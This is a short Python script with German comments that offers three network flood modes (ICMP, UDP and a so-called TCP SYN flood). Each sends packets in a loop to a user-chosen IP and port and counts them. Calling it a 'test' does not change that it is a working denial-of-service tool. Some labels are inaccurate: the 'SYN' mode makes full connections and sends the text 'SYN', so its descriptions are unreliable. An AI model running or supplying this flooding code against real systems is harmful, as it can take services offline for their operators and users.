import socket
import threading
import time
import random

# Globale Variablen
packet_counter = 0
stop_event = threading.Event()

# ICMP Flood
def icmp_flood(ip, duration):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    payload = random._urandom(1024)  # ICMP-Paketgröße
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        sock.sendto(payload, (ip, 0))
        packet_counter += 1

# UDP Flood
def udp_flood(ip, port, packet_size, duration):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(packet_size)
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        sock.sendto(payload, (ip, port))
        packet_counter += 1

# TCP SYN Flood
def syn_flood(ip, port, duration):
    global packet_counter
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, port))
            sock.send(b"SYN")
            packet_counter += 1
        except:
            pass
        finally:
            sock.close()

# Show statistics
def show_statistics():
    global packet_counter
    while not stop_event.is_set():
        print(f"Gesendete Pakete: {packet_counter}")
        time.sleep(1)

# Hauptfunktion
def main():
    global stop_event
    print("Wähle die Testoption:")
    print("1 - ICMP Flood\n2 - UDP Flood\n3 - SYN Flood")
    choice = input("Option: ")

    ip = input("Ziel-IP: ")
    duration = int(input("Testdauer (Sekunden): "))

    if choice in ["2", "3"]:
        port = int(input("Port: "))
    if choice == "2":
        packet_size = int(input("Paketgröße (Bytes): "))

    # Starte Statistikthread
    stats_thread = threading.Thread(target=show_statistics)
    stats_thread.daemon = True
    stats_thread.start()

    # Starte gewählten Test
    try:
        if choice == "1":
            threading.Thread(target=icmp_flood, args=(ip, duration)).start()
        elif choice == "2":
            threading.Thread(target=udp_flood, args=(ip, port, packet_size, duration)).start()
        elif choice == "3":
            threading.Thread(target=syn_flood, args=(ip, port, duration)).start()
        else:
            print("Ungültige Auswahl.")

        # Warte auf Testende
        time.sleep(duration)
    finally:
        stop_event.set()
        print("\nTest beendet.")

if __name__ == "__main__":
    main()
